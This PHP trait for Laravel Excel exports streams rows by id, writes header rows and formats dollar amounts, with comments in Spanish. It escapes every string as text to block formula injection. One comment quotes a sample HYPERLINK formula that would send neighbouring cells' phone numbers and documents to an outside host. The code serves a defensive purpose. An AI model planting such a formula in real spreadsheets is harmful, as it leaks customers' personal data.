<?php

declare(strict_types=1);

namespace App\Exports\Concerns;

use App\Domain\Money\Money;
use Generator;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;

/**
 * Lo que comparten las tres exportaciones (`REQ-BOF-043`, `T-070`).
 *
 * **Se lee por `chunkById`** (RB-11), con `lazyById()`, que pide lotes de
 * `CHUNK` filas por `id > último` y nunca tiene más de un lote en memoria.
 * `FromQuery` de `maatwebsite/excel` pagina con `OFFSET`, que en una tabla que
 * cambia mientras se lee repite o salta filas, y por eso no se usa. El orden
 * del archivo es por `id` —el de la consulta se quita (`reorder()`): ordenar
 * por fecha y paginar por `id` a la vez no es posible sin cargarlo todo—.
 *
 * Las tres declaran `WithStrictNullComparison`: sin ella, `maatwebsite/excel`
 * escribe un `0` como celda vacía, y «Pagado: 0» saldría en blanco.
 *
 * Encima de los encabezados, **la cabecera dice con qué se generó**: cuándo,
 * con qué filtros, cuáles se ignoraron porque dejaron de valer (SP-6) y
 * —en la cobranza— con cuántos días de gracia (`REQ-BOF-042` SP-4).
 */
trait StreamsRowsById
{
    /** Filas por lote. */
    public const CHUNK = 500;

    /** Cuántas filas de datos lleva escritas: la cuenta que guarda la exportación. */
    public int $rowCount = 0;

    /**
     * @template TModel of Model
     *
     * @param  Builder<TModel>  $query
     * @return Generator<int, TModel>
     */
    protected function streamById(Builder $query): Generator
    {
        $table = $query->getModel()->getTable();

        foreach ($query->reorder()->lazyById(self::CHUNK, $table.'.id', 'id') as $model) {
            $this->rowCount++;

            yield $model;
        }
    }

    /**
     * La cabecera del archivo: título, fecha y filtros, una línea en blanco y
     * los encabezados de las columnas.
     *
     * @param  array<string, string>  $meta  etiqueta => valor
     * @param  list<string>  $columns
     * @return list<list<string>>
     */
    protected function headingRows(string $title, array $meta, array $columns): array
    {
        $rows = [[$title]];

        foreach ($meta as $label => $value) {
            $rows[] = [$label, $value];
        }

        $rows[] = [''];
        $rows[] = $columns;

        return $rows;
    }

    /**
     * **Todo texto se escribe como texto** (revisión de `T-070`): el binder
     * por defecto convierte en fórmula cualquier cadena que empiece por `=`,
     * y el nombre de un cliente lo escribe **cualquiera** en el formulario
     * público de apartado. Un `=HYPERLINK("https://…?d="&B10&C10, "Ver")`
     * como nombre acabaría vivo en el Excel del negocio, mandando a quien sea
     * los teléfonos y documentos de las filas de al lado. Los números siguen
     * siendo números (RB-8).
     */
    public function bindValue(Cell $cell, mixed $value): bool
    {
        if (is_string($value)) {
            $cell->setValueExplicit($value, DataType::TYPE_STRING);

            return true;
        }

        return (new DefaultValueBinder)->bindValue($cell, $value);
    }

    /**
     * Un importe en dólares como número, para que Excel lo sume: nunca un
     * texto con el símbolo (RB-8).
     */
    protected static function dollars(Money|int $amount): float
    {
        return round(($amount instanceof Money ? $amount->cents : $amount) / 100, 2);
    }
}
